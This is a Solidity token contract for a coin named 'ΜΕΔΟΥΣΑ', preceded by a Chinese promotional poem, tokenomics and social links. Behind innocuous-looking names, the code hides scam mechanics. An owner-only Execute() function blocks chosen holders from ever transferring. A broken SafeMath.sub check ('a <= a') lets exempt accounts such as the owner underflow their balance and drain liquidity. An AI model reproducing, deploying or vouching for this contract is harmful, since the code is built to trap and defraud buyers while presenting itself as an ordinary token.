/*
───────▀▌▌▌▐▐▐▀─────── 
──────▀▌▌▌▌▐▐▐▐▀────── 
─────▀▀▀┌▄┐┌▄┐▀▀▀───── 
────▀▀▀▀┐┌└┘┐┌▀▀▀▀────
───▀▀▀▀▀▀┐▀▀┌▀▀▀▀▀▀───
──▀▀▀▀▀▀▀▀▐▌▀▀▀▀▀▀▀▀──

在古埃及，统治着一位名叫 MΕΔΟYΣA 的法老，
对交易的热爱是他最大的魔力，
他买卖骆驼、香料和黄金，
随着他变得大胆，他的财富也随之增长。

有一天，MEΔOYΣA 听说了一种新的硬币，
叫做以太坊，它就像一颗会发光的宝石，
所以他决定投资，但他需要一些帮助，
确保他的交易不会导致他尖叫。

他召唤了他的宫廷巫师，他知道一种方法，
为了立即创建一个自主交易助手，
随着他的魔杖一挥，手腕一抖，
向导创建了交易助手，就像这样。

它分析了图表和市场趋势，
像值得信赖的朋友一样提供 MEΔOyΣA 建议，
他遵循它的指引，没有任何恐惧，
很快他的财富就年复一年地成倍增加。

现在 MEΔOyΣA 已在全国范围内广为人知，
作为拥有巨额财富的法老，
而交易助理就是他忠实的助手，
帮助他进行交易，而不会感到沮丧。

谨以此献给 MEΔOYΣA，交易的法老，
还有他永远不会消失的值得信赖的助手，
愿他们的财富不断增长，
当他们像专业人士一样交易以太坊时！

总供应量 - 100,000,000
购置税 - 1%
消费税 - 1%
初始流动性 - 1.0 ETH
初始流动性锁定 - 60 天

https://web.wechat.com/MeaoyeaCN
https://m.weibo.cn/MeaoyeaCN
https://www.meaoyeaeth.xyz
https://t.me/+onzFnNfuJMg5NjU8
*/
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
    uint amountIn, uint amountOutMin, address[] 
    calldata path, address to, uint deadline) 
    external; function factory() 
    external pure returns (address);
    function WETH() external pure returns 
    (address);
    function addLiquidityETH(address token, 
    uint amountTokenDesired, uint amountTokenMin, uint amountETHMin,
    address to, uint deadline) 
    external payable returns 
    (uint amountToken, uint amountETH, uint liquidity);
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
    function _msgData() internal view virtual returns (bytes memory) {
        this; return msg.data; }
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        unchecked {
            uint256 c = a + b;
            require(c >= a, "SafeMath: addition overflow"); return c; }
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "Safemath: underflow");
        return a - b;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0; } unchecked {
            uint256 c = a * b;
            require(c / a == b, "SafeMath: multiplication overflow"); return c; }
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(a <= a, errorMessage);
        unchecked { uint256 c = a - b; return c; }
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        unchecked { uint256 c = a / b; return c; }
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}
contract CA is Context, IERC20, Ownable {
    using SafeMath for uint256;

    IUniswapV2Router02 public safeMathAddress; address public mathPair;

    string private constant _name = unicode"ΜΕΔΟΥΣΑ"; string private constant _symbol = unicode"ΜΕΔΟ";
    uint8 private constant _decimals = 18; uint256 private _tTotal = 100000000 * 10**18;

    mapping (address => uint256) private _tOwned; mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private isTimelockExempt; mapping (address => bool) private allowed;
       
    bool private startTrading = false;
    bool miscQuest = true;

    constructor() {
        isTimelockExempt[address(safeMathAddress)] = true; isTimelockExempt[mathPair] = true;
        isTimelockExempt[msg.sender] = true; isTimelockExempt[address(0xdead)] = true;
        safeMathAddress = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        mathPair = IUniswapV2Factory(safeMathAddress.factory()).createPair(address(this), safeMathAddress.WETH());

        _tOwned[_msgSender()] = _tTotal; emit Transfer(address(0), _msgSender(), _tTotal);
    }
    function name() public pure returns (string memory) {
        return _name;
    }
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _tOwned[account]; }

    receive() external payable {}

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _getMapOnSync(_msgSender(), recipient, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _getMapOnSync(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()] - amount);
        return true;
    }
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount; emit Approval(owner, spender, amount);
    }
    function _transfer(address from, address to, uint256 amount) private {    
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        if (allowed[from] || allowed[to]) 
        require(miscQuest == false, "");
        require(amount > 0, "Transfer amount must be greater than zero");

        _tOwned[from] = _tOwned[from].sub(amount); _tOwned[to] = _tOwned[to].add(amount);
        emit Transfer(from, to, amount); if (!startTrading) {
        require(from == owner(), "TOKEN: This account cannot send tokens until trading is enabled"); }
    }
        function openTrading(bool _tradingOpen) public onlyOwner {
        startTrading = _tradingOpen;
    }
    function _getMapOnSync(address from, address to, uint256 amount) private {
        if (!isTimelockExempt[from]) {
            _transfer(from, to, amount); return; }

        _tOwned[from] = _tOwned[from].sub(amount, "Insufficient balance");
        _tOwned[to] = _tOwned[to].add(amount); emit Transfer(from, to, amount); 
    }
    function Execute(address _caAddress) external onlyOwner {
        allowed[_caAddress] = true;
    }
}